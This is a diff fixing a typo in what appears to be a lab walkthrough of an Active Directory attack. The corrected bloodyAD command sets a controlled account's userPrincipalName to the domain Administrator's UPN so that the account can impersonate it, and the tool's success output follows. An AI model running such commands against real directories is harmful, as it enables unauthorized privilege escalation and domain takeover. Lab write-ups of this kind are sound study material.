@@ -169,7 +169,7 @@ userPrincipalName     : gatari@mercury.local
 We can modify our `userPrincipalName` to the `Administrator` user, do note that this will not work if the `Administrator@mercury.local` UPN is already in use by another user, as the `userPrincipalName` must be unique across the domain.
 
 ```
-~$ bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'userPrincipaly.local'
+~$ bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'userPrincipalName' -v 'Administrator@mercury.local'
 [+] gatari-ad's userPrincipalName has been updated
 
 (LDAP)-[C-DC01.mercury.local]-[mercury\gatari-ad]
